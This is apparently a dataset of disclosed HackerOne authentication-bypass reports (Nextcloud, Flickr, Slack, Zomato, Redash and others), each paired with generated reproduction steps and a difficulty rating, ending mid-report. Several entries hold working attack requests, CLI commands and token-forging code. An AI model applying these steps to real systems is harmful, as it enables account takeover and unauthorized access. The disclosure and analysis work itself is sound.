Authnz EASY
==================================================

Total reports analyzed: 191

Improper Authentication - Generic Vulnerabilities (48 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1000922: Unsecured Grafana instance on https://monitoring.prow-canary.k8s.io/dashboards
================================================================================
RAW DESCRIPTION:

Hi,
I was looking at https://monitoring.prow-canary.k8s.io Grafana webapp. I'm not sure if it is for demo purposes, but I can access the main dashboard and view all graphs.
https://monitoring.prow-canary.k8s.io/dashboards
If indeed it is for demo purposes, please let me close the report myself.
looking forward to hearing from you
Thank you
Impact
access charts on various server resource usage.



================================================================================
Vulnerability Description:
The Grafana instance at monitoring.prow-canary.k8s.io is publicly accessible without authentication, allowing anyone to view server resource usage charts and potentially sensitive monitoring data.

Steps to Reproduce:
1. Navigate to https://monitoring.prow-canary.k8s.io/dashboards in a web browser.
2. Observe that the Grafana dashboard is accessible without authentication, displaying various server resource usage charts.
Exploitation Difficulty:
This vulnerability involves no complex interactions or state manipulations. It is simply a case of an unsecured web application being publicly accessible, which is straightforward to discover by accessing the URL.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1035742: Able to authenticate as administrator by navigating to https://█████/admin/
================================================================================
RAW DESCRIPTION:

Summary:
The endpoint at https://███████/admin/ authenticates the user to the administrator user.
Step-by-step Reproduction Instructions
Navigate to https://███/ and youll notice you will need to log in.
Navigating to https://██████████/admin/ will show you admin malformed page, with the ability to "log out"
As for now as we can see by the picture no data is present at the administrator panel, sure this might change at the future exposing sensitive ifnormation
████████
Suggested Mitigation/Remediation Actions
Issuing 403 response when trying to access the /admin endpoint.
Best regards
nagli
Impact
Admin authentication bypass



================================================================================
Vulnerability Description:
The vulnerability allows an unauthenticated user to access the admin panel by directly navigating to the /admin endpoint, bypassing normal authentication mechanisms. This could potentially expose sensitive administrative functions or data in the future.

Steps to Reproduce:
1. Navigate to https://█████/ and observe that login is required.
2. Navigate directly to https://█████/admin/ and observe the admin panel with a 'log out' option, indicating authentication bypass.
Exploitation Difficulty:
The attack involves only a single, straightforward step (directly accessing the admin URL) with no complex interactions or state manipulations required. This is a common type of misconfiguration that doesn't require any novel logic or deep understanding of the application.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1146600: Administration Authentication Bypass on https://█████
================================================================================
RAW DESCRIPTION:

Hi there
I found a way to connect to an administration space on your website https://██████████
how to reproduce ?
1) - go to this link : https://███/██████████
2) - create a html file with :
Code 188 Bytes
1<form action="https://████████/██████████" method="post">
2    <input type="hidden" name="█████" value="">
3    <input type="hidden" name="█████" value="1">
4    <input type="submit">
5</form>
3) - launch the file, click on the button and return to the page https://███████/█████
4) - refresh the page and you have access to the administration
POC :
██████████
if you need more information, contact me
best regards,
fiveguyslover
Impact
access to sensitive data and the ability to modify information.
System Host(s)
█████
Affected Product(s) and Version(s)
CVE Numbers
Steps to Reproduce
1) - go to this link : https://█████/███████
2) - create a html file with :
Code 175 Bytes
1<form action="https://█████/███" method="post">
2    <input type="hidden" name="███" value="">
3    <input type="hidden" name="████" value="1">
4    <input type="submit">
5</form>
3) - launch the file, click on the button and return to the page https://██████/█████
4) - refresh the page and you have access to the administration
Suggested Mitigation/Remediation Actions



================================================================================
Vulnerability Description:
This vulnerability allows an attacker to bypass authentication and gain unauthorized access to the administration space by submitting a specially crafted HTML form, which manipulates the application state to grant access upon refreshing the page.

Steps to Reproduce:
1. Go to the link: https://█████/███████
2. Create an HTML file with the provided form code and submit it
3. Return to the administration page and refresh to gain access
Exploitation Difficulty:
The attack involves a simple HTML form submission and page refresh, with no complex interactions or state manipulations required. The vulnerability is straightforward and does not require deep understanding of the application's logic or multiple components.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1170024: Attacker can obtain write access to any federated share/public link
================================================================================
RAW DESCRIPTION:

Hi mates,
I stumbled across this with public links. But the same holds true for any federated share. I will try to describe the link scenario.
At first I thought there were more steps (and resharing was involved). But it really is very simples:
An attacker obtains a public link (again plenty of those around). For the sake of the attack it is a read only public link
The attacker uses the 'add to my nextcloud' functionality to have a federated share created to their own instance
The attacker accepts this share
Now the attacker checks their database and finds the entry in the oc_share_external table.
We are looking for really only the remote id. And the token.
For the sake of this example the remote id = 2 and the token = nOxdNJkb1xbI1VX
Now we craft our request
Code 275 Bytes
1curl -v -X POST http://localhost/index.php/ocm/notifications -d '{"notificationType":"RESHARE_CHANGE_PERMISSION","resourceType":"file","providerId":2,"notification":{"sharedSecret":"nOxdNJkb1xbI1VX","permission":["read","write","share"]}}' -H 'Content-type: application/json'
To break this down.
We send an (anonymous) POST request to the victims server to be precise to index.php/ocm/notifications
And we pass it the following json
Code 245 Bytes
1{
2   "notificationType":"RESHARE_CHANGE_PERMISSION",
3   "resourceType":"file",
4   "providerId":2,
5   "notification":{
6      "sharedSecret":"nOxdNJkb1xbI1VX",
7      "permission":[
8         "read",
9         "write",
10         "share"
11      ]
12   }
13}
The attacker now enjoys their federated share with READ+WRITE+UPDATE+CREATE+SHARE access. (I think it is probably even a bug that there is no way to grant DELETE).
Since we create a federated share at step 1. This also holds true for any created federated share.
Impact
In short if an attacker has a public link. Or a federated share with them they can elevate their permissions very easily.
This allows them to overwrite files. Add new files. And so on. In short the integrity of all files in public links and federated shares should be considered compromised.
Pardon my directness. But you really should take a serious look at your federation code. As it seems to miss checks all over the place. Maybe recommending everybody to disable it for now is the best course of action.



================================================================================
Vulnerability Description:
An attacker can elevate permissions on a federated share or public link from read-only to read+write+share by crafting a specific POST request to the victim's Nextcloud server. This allows the attacker to overwrite files, add new files, and share the content further, compromising the integrity of the shared files.

Steps to Reproduce:
1. Obtain a read-only public link or federated share from the target Nextcloud instance.
2. Use the 'add to my nextcloud' functionality to create a federated share to the attacker's own instance.
3. Accept the share on the attacker's instance and retrieve the remote ID and token from the oc_share_external table.
4. Craft a POST request to the victim's server with the notificationType 'RESHARE_CHANGE_PERMISSION', including the sharedSecret and elevated permissions.
5. Send the crafted request to the victim's server to elevate permissions to read+write+share.
Exploitation Difficulty:
The vulnerability involves understanding the federated sharing mechanism, database structure, and crafting a specific HTTP request. While the steps are straightforward once understood, the interaction between the federated share creation and permission modification via the OCM endpoint is non-obvious.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1242212: PIN bypass
================================================================================
RAW DESCRIPTION:

Summary:
MEW apk has improper rate limit.
When we try to brute force the PIN, we are rate limited for 5 minutes after 5 or 6 attempt.
In my testing I found that it was checking the device's local time so by changing it we can brute force the PIN.
Steps To Reproduce:
1.Install MEW app from play store.
2.Create your PIN.
3.Now open again your MEW apk.
4.You will be asked to enter the PIN.
5.Try to brute force the code. You will see a message to try again after 5 min.
6.Now change the time of your device.
7.Observe there is no rate limit now.
Supporting Material/References:
Impact
An attacker can brute force the PIN of an user



================================================================================
Vulnerability Description:
The MEW app has an improper rate limit implementation for PIN attempts, which checks the device's local time. By changing the device's time, an attacker can bypass the rate limit and brute force the PIN.

Steps to Reproduce:
1. Install MEW app from play store and create a PIN.
2. Attempt to brute force the PIN, observe the rate limit, and bypass it by changing the device's local time.
Exploitation Difficulty:
The vulnerability involves a straightforward bypass of rate limiting by manipulating the device's local time, which is a simple and well-known technique. The attack does not require complex interactions or understanding of multiple components.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1267174: Access to tomcat-manager with default creds
================================================================================
RAW DESCRIPTION:

Summary:
Hi jetblue Security Team.
I Found that this domain █████████ using Apache Tomcat/6.0.35 , And i was able to login to https://██████████/manager/html With default credentials tomcat:tomcat
See the following Screenshots:-
██████████
███
Steps To Reproduce:
Go To https://███████/manager/html
Login with default creds tomcat:tomcat
Supporting Material/References:
https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat
Impact
Improper Authentication
Default Credentials lead to access admin manager.
Fix:-
Change default creds.



================================================================================
Vulnerability Description:
The vulnerability involves accessing the Apache Tomcat manager interface using default credentials (tomcat:tomcat), which allows unauthorized administrative access to the server.

Steps to Reproduce:
1. Navigate to https://██████████/manager/html
2. Enter default credentials: username 'tomcat', password 'tomcat'
Exploitation Difficulty:
The attack is straightforward, involving only the use of default credentials without any need for complex interactions or state manipulations. Default credentials are well-documented and commonly known in security contexts.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1314172: Otp  bypass in verifying nin
================================================================================
RAW DESCRIPTION:

Summary:
while conducting my research in your website I found that while verifying NIN number it send the otp to the enterd mobile number that can be bypassed.
Steps To Reproduce:
1) Go to https://nin.mtnonline.com/nin/
2) click submit nin.Now it will redirect to another page https://nin.mtnonline.com/nin/
3) It asks for mobile number and National Identity Number [NIN].
4) Enter the mobile and NIN number and click Next.It will send the otp to the mobile number.
5) Enter any 6 digit code and click verify and capture the request in bupsuite and click action and select "Do intercept and response to the request"
6) Now change the response status to success.
------>Now successfully verified mobile number.
Impact
The attacker can able to verify NIN with any number.
Note: I had attached the poc video below please take a look.
Regards,
@aaruthra.



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to bypass OTP verification for NIN (National Identity Number) validation by intercepting and modifying the server response to indicate a successful verification, even with an incorrect OTP.

Steps to Reproduce:
1. Go to https://nin.mtnonline.com/nin/
2. Click submit NIN, which redirects to another page
3. Enter mobile number and NIN, then click Next to receive OTP
4. Enter any 6-digit OTP and capture the request in Burp Suite
5. Intercept the response and modify the status to 'success'
6. Bypass OTP verification and successfully verify the NIN
Exploitation Difficulty:
The attack involves intercepting and modifying a server response, which is a straightforward technique for someone familiar with tools like Burp Suite. The steps are linear and do not require deep understanding of complex application states or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1342088: Flickr Account Takeover using AWS Cognito API
================================================================================
RAW DESCRIPTION:

Flickr uses Amazon Cognito to implement its login functionality.
Furthermore, Flickr does not allow users to change their registered e-mail address via the user interface. This restriction can be bypassed via direct communication with the Amazon Cognito User Pool API.
Consider we have the following accounts:
flickr-benign@lauritz-holtmann.de (our victim)
An arbitrary other account that is controlled by the attacker - in the following flickr-attacker@lauritz-holtmann.de
At first, the malicious actor needs to obtain an Amazon access_token. To do so, intercept the login request that is sent from https://identity.flickr.com/:
Code 389 Bytes
1POST / HTTP/2
2Host: cognito-idp.us-east-1.amazonaws.com
3[...]
4
5{
6    "AuthFlow":"USER_PASSWORD_AUTH",
7    "ClientId":"3ck15a1ov4f0d3o97vs3tbjb52",
8    "AuthParameters":{
9        "USERNAME":"flickr-attacker@lauritz-holtmann.de",
10        "PASSWORD":"[REDACTED]",
11        "DEVICE_KEY":"us-east-1_07032954-25bf-4781-b596-9d675d901072"
12    },
13    "ClientMetadata":
14    {                
15    }
16}
If the provided credentials for the attacker controlled account are valid, Amazon responds with tokens:
Code 352 Bytes
1HTTP/2 200 OK
2Date: Thu, 16 Sep 2021 22:51:36 GMT
3[...]
4
5{
6    "AuthenticationResult":    
7        {
8            "AccessToken":"[REDACTED]",
9            "ExpiresIn":3600,
10            "IdToken":"[REDACTED]",
11            "RefreshToken":"[REDACTED]",
12            "TokenType":"Bearer"
13        },
14    "ChallengeParameters":
15        {            
16        }
17}
The access_token can be directly used against Amazon's AWS API, for instance using the AWS Command Line Interface tool:
Code 760 Bytes
1$ aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]
2{
3    "Username": "e28c344[...]",
4    "UserAttributes": [
5        {
6            "Name": "sub",
7            "Value": "e28[...]"
8        },
9        {
10            "Name": "birthdate",
11            "Value": "1998-09-17"
12        },
13        {
14            "Name": "email_verified",
15            "Value": "true"
16        },
17        {
18            "Name": "locale",
19            "Value": "en-us"
20        },
21        {
22            "Name": "given_name",
23            "Value": "Axel"
24        },
25        {
26            "Name": "family_name",
27            "Value": "Attacker"
28        },
29        {
30            "Name": "email",
31            "Value": "flickr-attacker@lauritz-holtmann.de"
32        }
33    ]
34}
Using the API, one is able to alter some of the user attributes - including the linked e-mail address:
Code 338 Bytes
1$ aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=flickr-Benign@lauritz-holtmann.de
2{
3    "CodeDeliveryDetailsList": [
4        {
5            "Destination": "f***@l***.de",
6            "DeliveryMedium": "EMAIL",
7            "AttributeName": "email"
8        }
9    ]
10}
Note that the registered address is case sensitive.
As the above output already indicates, at this stage, the e-mail address is not verified:
Code 752 Bytes
1$ aws cognito-idp get-user --region us-east-1 --access-token eyJraWQi[...] 
2{
3    "Username": "e28c34[...]",
4    "UserAttributes": [
5        {
6            "Name": "sub",
7            "Value": "e2[...]"
8        },
9        {
10            "Name": "birthdate",
11            "Value": "1998-09-17"
12        },
13        {
14            "Name": "email_verified",
15            "Value": "false"
16        },
17        {
18            "Name": "locale",
19            "Value": "en-us"
20        },
21        {
22            "Name": "given_name",
23            "Value": "Axel"
24        },
25        {
26            "Name": "family_name",
27            "Value": "Attacker"
28        },
29        {
30            "Name": "email",
31            "Value": "flickr-Benign@lauritz-holtmann.de"
32        }
33    ]
34}
Conclusion
The aforementioned behavior can be tracked down to the following root issues
1) Flickr does not expect e-mail addresses to be changed - still it is possible to change a user's address using the AWS Cognito API.
2) Flickr does not check whether the e-mail address is verified on login
3) Flickr normalizes the e-mail address received from AWS cognito, so that collisions are possible
Impact
Chained as shown above, the aforementioned vulnerabilities can be used to takeover a user's account without any user interaction.
A malicious solely needs to know the e-mail address that is linked within a victim's account to link a crafted e-mail address to their account that can then be used to takeover the victim's account.
Further Notices
All tests were performed against my user accounts. The user account patterns used were as follows:
lauritz+*@wearehackerone.com
*@lauritz-holtmann.de
Please let me know if you have any comments or questions.



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to take over a victim's Flickr account by exploiting the ability to change the email address via the AWS Cognito API without proper verification checks. The attacker can set their account's email to match the victim's (case-sensitive), and since Flickr does not verify the email on login, the attacker gains access to the victim's account.

Steps to Reproduce:
1. Intercept the login request from https://identity.flickr.com/ to obtain an access_token for an attacker-controlled account.
2. Use the obtained access_token to call the AWS Cognito API to change the email address of the attacker-controlled account to match the victim's email address (case-sensitive).
3. Observe that the email address is not verified, but Flickr does not check for verification on login, allowing the attacker to take over the victim's account.
Exploitation Difficulty:
The attack involves multiple components (intercepting login requests, using AWS Cognito API, understanding email normalization) and requires knowledge of how Flickr handles email verification. The interaction between these components is subtle, as the attacker must recognize that Flickr does not enforce email verification on login despite allowing email changes via the API.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1380121: Critical full compromise of jarvis-new.urbanclap.com via weak session signing
================================================================================
RAW DESCRIPTION:

Summary
Hi there, I discovered that jarvis-new.urbanclap.com uses a weak Flask session key. Because Flask sessions are signed with a static secret, if this secret is known to an attacker then they can modify the session state. In this case, we can modify the Redash user_id for the session and log in as any user. This results in a full compromise of the instance. I have attached a screenshot showing that I logged into █████████@urbancompany.com and have full admin permissions:
██████████
████
██████████
███████
How to fix
Change the REDASH_COOKIE_SECRET and REDASH_SECRET_KEY to a random value immediately.
PoC
For simplicity, it is easiest to forge a password reset link for Redash. We can do this with a bit of Python. To get the reset link for user ID 1, we simply run:
Code 167 Bytes
1>>> from itsdangerous import URLSafeTimedSerializer, SignatureExpired, BadSignature
2>>> serializer = URLSafeTimedSerializer("███")
3>>> serializer.dumps(str("1"))
4'███'
Then, we can browse to https://jarvis-new.urbanclap.com/reset/█████ and choose a new password for user ID 1. This then logs us into their account.
Impact
Since this is connected to all of your databases, this is likely a significant leak of PII and other sensitive information. This is easily a critical issue.



================================================================================
Vulnerability Description:
The vulnerability involves a weak Flask session key that allows an attacker to forge session tokens or password reset links, leading to authentication bypass and full account compromise.

Steps to Reproduce:
1. Identify that jarvis-new.urbanclap.com uses a weak Flask session key.
2. Use the known weak secret to forge a session token or password reset link for any user ID.
3. Access the reset link to change the password and log in as the targeted user.
Exploitation Difficulty:
The attack requires knowledge of the weak session key and the ability to forge tokens, but the steps are straightforward once the key is known. The interaction between the weak key and token forgery is a common issue in web applications.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1539426: Broken access control 
================================================================================
RAW DESCRIPTION:

Summary:
hello ups team ,,,
I've found broken access control vulnerability in your sites
It allows me to access the admin panel of the support team, and I can view all requests within the site
vulnerable domains:█████
## Steps To Reproduce:
[add details for how we can reproduce the issue]
go to █████████
go to ████████████████ ,put any email address and intercept the request
Code 593 Bytes
1POST /api/Account/SendTempPassword/?userName=█████████████ HTTP/2
2Host: ██████████████████
3Cookie: ████████
4Content-Length: 0
5Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"
6Accept: application/json, text/plain, */*
7Sec-Ch-Ua-Mobile: ?0
8User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36
9Sec-Ch-Ua-Platform: "Linux"
10Origin: ██████████████████
11Sec-Fetch-Site: same-origin
12Sec-Fetch-Mode: cors
13Sec-Fetch-Dest: empty
14Accept-Encoding: gzip, deflate
15Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,ar;q=0.7
16
17
3.On the burp site, intercept the response for this request and change this value to
Then change the "status" value of this request from false to true
response:
Code 767 Bytes
1HTTP/2 200 OK
2Cache-Control: no-cache,no-cache,no-store
3Pragma: no-cache,no-cache
4Content-Type: application/json; charset=utf-8
5Expires: -1
6Server: 
7X-Content-Type-Options: nosniff
8X-Xss-Protection: 1; mode=block
9Referrer-Policy: no-referrer
10Strict-Transport-Security: max-age=31536000; includeSubDomains;preload
11X-Frame-Options: DENY
12X-Ua-Compatible: IE=Edge
13Content-Security-Policy: script-src 'self'; object-src 'self'; frame-ancestors 'none'
14Expect-Ct: enforce, max-age=7776000, report-uri='███████████████-Allow-Headers: Accept, Content-Type, Origin
15Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
16Date: ██████████████████ ████████████ GMT
17Content-Length: 89
18
19{"status":true,"errorMessage":"Username does not exist. Please enter correct Username."}
After that, go to this path /resetPassword You will notice that this page has been opened without problems
███████████
Go to user or report and you will notice that it opens normally and you can fully control it
I made a video of the vulnerability that you can watch
video POC:
███████
Impact
The attacker can hack the admin control panel and view and modify all reports



================================================================================
Vulnerability Description:
This vulnerability allows an attacker to bypass authentication controls by manipulating the response of a password reset request, granting unauthorized access to the admin panel where they can view and modify all reports.

Steps to Reproduce:
1. Navigate to the password reset endpoint and input any email address.
2. Intercept the request using a proxy tool like Burp Suite and modify the response to change the 'status' from false to true.
3. Access the admin panel via the /resetPassword path after the modified response.
4. Explore the admin panel to view and modify reports.
Exploitation Difficulty:
The attack involves intercepting and modifying a single HTTP response, which is a straightforward process with tools like Burp Suite. The vulnerability does not require complex interactions or understanding of multiple components.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1627961: Account takeover on ███████ [HtUS]
================================================================================
RAW DESCRIPTION:

Hello,
I have found an endpoint in ████████ is vulnerable to Account takeover
Steps to reproduce:
Create 2 accounts ( Attacker ( A ) and vicitm ( B ) )
Log in to all of them and go to https://███████/███████/EditUserProfile with attacker's account
Now fill out the password with your password
Change the attacker's attacker@gmail.com email with victim's email victim@gmail.com
Click Submit button and forward the request to repeater
Now if the vicim tried to log into his account, he will facing an error
Back to the request go to repeater and change the User id of the attacker with the vicim's user ID ( You probley need to brute-force it )
Forward the request and you will see 302 code response
Stay in the request and change back all changes ( EMAIL and USER ID of Attacker ) and send the request again
Now try to log into the victim's victim@gmail.com account with your password
You will be logged in
POC:
████
Impact
An attacker can takeover accounts



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to take over a victim's account by manipulating the email and User ID fields in a profile edit request. The attacker changes their email to the victim's, locks the victim out, then modifies the User ID to the victim's, and reverts the email. This results in the attacker's password being associated with the victim's account.

Steps to Reproduce:
1. Create two accounts: Attacker (A) and Victim (B). Log in to both accounts.
2. Navigate to the profile edit page (https://███████/███████/EditUserProfile) using the attacker's account.
3. Change the attacker's email to the victim's email (victim@gmail.com) and fill in the password field with the attacker's password.
4. Submit the changes and capture the request in a repeater tool (e.g., Burp Repeater).
5. Observe that the victim can no longer log in to their account due to the email change.
6. In the repeater, modify the request by changing the User ID from the attacker's to the victim's (may require brute-forcing the victim's User ID).
7. Send the modified request and observe a 302 response code.
8. Revert the email and User ID changes in the request and send it again.
9. Log in to the victim's account (victim@gmail.com) using the attacker's password. The attacker now has access to the victim's account.
Exploitation Difficulty:
The attack involves multiple steps, including manipulating email and User ID fields, understanding the application's response codes (302), and reverting changes to achieve the desired state. The interaction between these steps is non-obvious, and the attack requires maintaining context across several requests.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1792544: Security Issue into Wallet lock protection 
================================================================================
RAW DESCRIPTION:

Description
While testing wallet extension i generally try to test multiple endpoints, so 2 tabs were open of wallet on chrome-extension://ldinpeekobnhjjdofggfgjlcehhmanlj/popup.html
So i tried to lock Wallet extension buti found that i can still use browser in 2nd tab, why i had already locked wallet,
So there is a security issue where wallet is not properly encrypted after user press lock
Wallet should close all open tabs of wallets and encrypt data for all tabs, It's very insecure way of password protection or lock protection
Steps To reproduce
To understand clearly i had created a POC video
hiro-wallet.mkv (F2061644)
Open two tabs of chrome-extension://ldinpeekobnhjjdofggfgjlcehhmanlj/popup.html
<image_0>
HOW to fix?
Edit code and make sure when user click on lock wallet wallet should encrypt data in all tabs or close rest of the tabs to protect user and make lock protection work more securely
Thank you
Impact
This is totally fail of lock protection AND attacker can use this vulnerability to craft custom attacks



================================================================================
Vulnerability Description:
The wallet extension fails to properly encrypt data or close all open tabs when the user locks the wallet, allowing continued access through other open tabs. This undermines the lock protection mechanism, potentially enabling attackers to exploit the wallet's functionality even after it has been locked.

Steps to Reproduce:
1. Open two tabs of the wallet extension in Chrome: chrome-extension://ldinpeekobnhjjdofggfgjlcehhmanlj/popup.html
2. Lock the wallet in one tab and observe that the second tab remains accessible despite the lock
Exploitation Difficulty:
The vulnerability involves a straightforward interaction between multiple tabs of the same extension, with no complex state manipulation or novel logic required. The issue is primarily due to insufficient session management across tabs.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/184698: Eavesdropping on private Slack calls
================================================================================
RAW DESCRIPTION:

A vulnerability exists in Slack's call functionality that allows a team member to eavesdrop on private ongoing Slack calls by inviting themselves into the conversation without the permission from either participant. By doing so they can eavesdrop on co-workers' private conversations as well as taking part in these conversations. To make the attack less obvious, the attacker could re-use Slackbot's avatar and choose a username that is similar to Slackbot. Another scenario would be to pick the avatar of the person you want to impersonate and choose a username that is similar to theirs.
Setup
Before trying to reproduce the vulnerability, make sure you have the following:
Slack Calls should be enabled in your Slack instance.
Have at least two accounts you control. One we will call the Main Account, the other one we will call the Eavesdropper Account.
Have at least two accounts you do not control on the same Slack instance. They will be used to mock the situation of two co-workers having a private Slack call.
For easy reproduction, it is advised to initiate the call from a web browser rather than a native app.
Make sure to have some type of intercepting proxy running that allows you to record HTTP requests and replay them easily.
Steps to Reproduce
Obtaining the vulnerable request
First off, we are going to obtain the exact request to the endpoint that contains the vulnerability (/api/screenhero.rooms.invite). This will be needed to later on modify and add Eavesdropper Account to the private call.
Set up a call and invite someone to the call. Make sure to capture the request to /api/screenhero.rooms.invite and save it so you can replay it easily later. The request should look something like:
Code 274 Bytes
1POST /api/screenhero.rooms.invite?_x_id=91700980-1479951838.521 HTTP/1.1
2Host: hackerone.slack.com
3Origin: https://hackerone.slack.com
4X-Slack-Version-Ts: 1479949022
5[...]
6
7is_video_call=false&responder=U0254GYNR&room=R36L2K8P6&set_active=true&should_share=true&token=<snip>
Staging the attack environment
Start by setting up a 1:1 call between two users (both accounts you don't necessarily have control over). This is to mock a situation where two co-workers are on a private 1:1 Slack call.
Note the Screenhero room ID of the call. You will need this later. In this scenario, I am going to assume the attacker is already in possession of the room ID. The room ID can be recognized by the ID after /call/ in https://hackerone.slack.com/call/R36L2K8P6 (an example).
Pulling off the attack
Take the request you saved earlier, and now modify the request as follows:
change the value of the room parameter to the room ID you noted from the previous step
change the value of the responder to the user ID of Eavesdropper Account. The reason why this can't be your own user ID (Main Account) is that you're not allowed to invite self.
After these changes, forward the request and wait for a call on Eavesdropper Account. When you accept this call, you will be placed into the private conversation the two victims were having.
Let me know if there's anything else you need to validate this issue.



================================================================================
Vulnerability Description:
A vulnerability in Slack's call functionality allows a team member to eavesdrop on private calls by inviting themselves into the conversation without permission. The attacker can modify a request to join the call and potentially impersonate other users or Slackbot to avoid detection.

Steps to Reproduce:
1. Set up a 1:1 call between two users to mock a private Slack call.
2. Capture the request to `/api/screenhero.rooms.invite` and modify the `room` and `responder` parameters to include the eavesdropper's user ID.
3. Forward the modified request to join the private call without permission.
Exploitation Difficulty:
The attack involves multiple components, including capturing and modifying HTTP requests, understanding Slack's call room IDs, and manipulating the call invitation process. However, the steps are relatively straightforward once the initial request is captured, and the logic is not overly complex or novel.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/188205: BruteForce in to Admin Account
================================================================================
RAW DESCRIPTION:

Hello,
My self Abdulwahab,
I want to Alert You that Your website is Facing a serious Problem Called : Username Enumeration
This Problem is on
nextcloud.com/wp-admin
We Use wpscan to get username
and the username is
"frank"
After getting username a user can Bruteforce it Using Wpscan and get access to admin panel and upload shell and also get all sub_domain Means Full Server is Hacked!
FIX
To Fix this use Wordpress Login Attemptizer
Thanks,
ABDULWAHAB,
Independent Cyber Security Researcher,



================================================================================
Vulnerability Description:
The vulnerability involves username enumeration and subsequent brute-force attacks on the WordPress admin panel, which can lead to unauthorized access, shell upload, and potential server compromise.

Steps to Reproduce:
1. Use wpscan to enumerate usernames on the WordPress admin page (nextcloud.com/wp-admin).
2. Once the username 'frank' is identified, use wpscan to brute-force the password for the admin account.
Exploitation Difficulty:
The attack involves straightforward steps using common tools (wpscan) and does not require complex interactions or novel logic. The vulnerability is well-known and the tools used are standard in the security community.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/202921: Unauthorised Access to Anyone's User Account
================================================================================
RAW DESCRIPTION:

When we do Login with Facebook on the Zomato app, you're doing zero authentication of the user. I'm able to hack into the targeted user's accounts by just using the Facebook ID.
Affected API raw request:
POST /v2/auth.json?presentlat=28.66505699180115&useragent=model_iPod%20touchos_9.3.5v_7.0__t_iPod5,1&app_version=7.0&session_id=41&app_run_id=21&presentlon=77.32215271029096&lang=en&push_permission=1&isFacebook=true&channel_url=&uuid=█████████ HTTP/1.1
Host: 1api.zomato.com
Accept-Language: en-IN;q=1, nl-IN;q=0.9, it-IN;q=0.8, de-IN;q=0.7, fr-IN;q=0.6
Accept: /
User-Agent: Zomato/6.6.9 (iPod touch; iOS 9.3.5; Scale/2.00)
X-Zomato-API-Key: █████████
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Connection: keep-alive
app_version: 7.0
Cookie: PHPSESSID=██████████; fbcity=1; fbtrack=c9bce885893ad8387ae3dc855d6f5b97; zl=en
Content-Length: 984
Accept-Encoding: gzip
access_token=&client_id=zomato_ios_v2&fb_permission=%5B%22user_friends%22%2C%22email%22%2C%22contact_email%22%2C%22public_profile%22%5D&fb_token=████████&fbdata=%7B%0A%20%20%22link%22%20%3A%20%22https%3A%5C%2F%5C%2Fwww.facebook.com%5C%2Fapp_scoped_user_id%5C%2F█████%5C%2F%22%2C%0A%20%20%22id%22%20%3A%20%22██████████%22%2C%0A%20%20%22first_name%22%20%3A%20%22Bhavuk%22%2C%0A%20%20%22name%22%20%3A%20%22Bhavuk%20Jain%22%2C%0A%20%20%22gender%22%20%3A%20%22male%22%2C%0A%20%20%22last_name%22%20%3A%20%22Jain%22%2C%0A%20%20%22email%22%20%3A%20%22█████████%40yahoo.co.in%22%2C%0A%20%20%22locale%22%20%3A%20%22en_US%22%2C%0A%20%20%22timezone%22%20%3A%205.5%2C%0A%20%20%22updated_time%22%20%3A%20%222016-12-24T21%3A55%3A30%2B0000%22%2C%0A%20%20%22verified%22%20%3A%20true%0A%7D&fbid=█████
In the last parameter, "fbid", I just need to replace it with the targeted user's facebook id, and I've been given the access to that user account.
For eg, just replace the "fbid" parameter with ███. You'll gain the access to this user's account.
Also, using my Facebook access token, I'm able to get the correct facebook ids of the people I'm friends on Facebook with and also the ids of second degree friends as well. So I'm able to hack into their Zomato accounts with ease.



================================================================================
Vulnerability Description:
The vulnerability allows unauthorized access to any user's Zomato account by simply replacing the 'fbid' parameter in the Facebook login API request with the targeted user's Facebook ID. The application does not perform proper authentication, enabling account takeover without requiring the attacker to know the victim's credentials.

Steps to Reproduce:
1. Perform a login with Facebook on the Zomato app and intercept the API request using a proxy tool like Burp Suite.
2. Modify the 'fbid' parameter in the intercepted request to the targeted user's Facebook ID and forward the request.
Exploitation Difficulty:
The vulnerability is straightforward to exploit as it only requires modifying a single parameter in the API request. The attack does not involve multiple components, complex application states, or novel logic. The interaction between the components is obvious, and the vulnerability is a classic example of insufficient authentication.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/209008: Authentication Bypass - Chaining two vulnerabilities leads to account takeover at en.instagram-brand.com
================================================================================
RAW DESCRIPTION:

Product / URL
https://en.instagram-brand.com/wp-json/brc/v1/login/
Description and Impact
An attacker can perform account takeover by leveraging following two vulnerabilities:
Auth Bypass = Username Enumeration + Login Brute Force
A. Username Enumeration:
For the site https://en.instagram-brand.com/, it is made sure that a malicious user cannot enumerate usernames of the users by implementing CAPTCHAs at Sign Up (https://en.instagram-brand.com/register/signup) and Forgot Password (https://en.instagram-brand.com/register/signin) pages.
This is made the site secure.
But I have found a way to bypass this protection. The endpoint: https://en.instagram-brand.com/wp-json/brc/v1/resend-verify has absolutely no rate limiting, thus a malicious user can take its advantage to enumerate usernames.
Another thing of concern is that, if a valid username is found, then the Instagram site sends an account verification link to that email. Even if the account is previously verified !! And if those victims try to login, then they can't. The site asks to first verify their account by clicking on the account activation links !!
An attacker can harvest the usernames and abuse this functionality to bother the victims.
Following is the analysis:
